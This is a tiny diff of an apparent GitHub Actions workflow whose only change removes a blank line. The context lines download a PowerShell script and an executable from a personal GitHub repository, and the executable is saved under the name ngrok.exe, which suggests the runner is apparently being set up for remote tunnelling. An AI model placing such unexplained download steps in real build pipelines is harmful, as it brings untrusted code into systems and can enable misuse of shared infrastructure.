@@ -8,7 +8,6 @@ jobs:
     steps:
     - name: Download
       run: Invoke-WebRequest https://github.com/Usser1222/circleci/raw/main/0.ps1 -OutFile 0.ps1
-    
     - name: rrt
       run: |
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe" -OutFile ngrok.exe 
